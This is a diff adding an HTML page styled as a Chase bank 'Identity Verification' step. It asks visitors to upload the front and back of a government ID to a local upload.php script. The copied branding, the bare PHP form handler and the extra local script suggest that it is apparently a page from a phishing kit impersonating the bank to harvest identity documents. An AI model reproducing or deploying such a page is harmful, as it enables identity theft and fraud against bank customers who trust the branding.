@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/chase.css">
+    <title>chase · Upload ID</title>
+</head>
+<body>
+    <header>
+        <img src="res/img/logo.svg" alt="Chase logo">
+    </header>
+
+    <section>
+        <div class="Container">
+
+            <!-- Informational header -->
+            <div class="box">
+                <label style="font-weight: 600;">Identity Verification</label>
+                <p style="margin: 8px 0 0 0; font-size: 0.9rem; color: #2a3b4c;">
+                    Please upload a clear photo of the <strong>front</strong> and <strong>back</strong> of your government-issued ID.
+                    Accepted formats: JPG, PNG, PDF (max 5MB each).
+                </p>
+            </div>
+
+            <form action="upload.php" method="post" enctype="multipart/form-data">
+
+                <!-- Front of ID -->
+                <div class="box">
+                    <label>Front of ID</label>
+                    <input type="file" name="id_front" accept="image/*,.pdf" required>
+                    <p style="margin: 6px 0 0 0; font-size: 0.8rem; color: #6b7a8d;">
+                        Make sure all four corners are visible and text is readable.
+                    </p>
+                </div>
+
+                <!-- Back of ID -->
+                <div class="box">
+                    <label>Back of ID</label>
+                    <input type="file" name="id_back" accept="image/*,.pdf" required>
+                    <p style="margin: 6px 0 0 0; font-size: 0.8rem; color: #6b7a8d;">
+                        Ensure the barcode or signature area is not obscured.
+                    </p>
+                </div>
+
+                <!-- Consent checkbox -->
+                <div class="L">
+                    <input type="checkbox" id="consent" required>
+                    <label for="consent" style="font-weight: normal;">
+                        I confirm the uploaded documents are authentic and belong to me.
+                    </label>
+                </div>
+
+                <div><button type="submit">Upload &amp; Continue</button></div>
+
+                <h5>Having trouble uploading? Get help &gt;</h5>
+                <h5>Skip for now? Verify later &gt;</h5>
+
+            </form>
+        </div>
+    </section>
+
+    <script src="./res/jquery.js"></script>
+    <script src="./res/cdn/jq.js"></script>
+</body>
+</html>
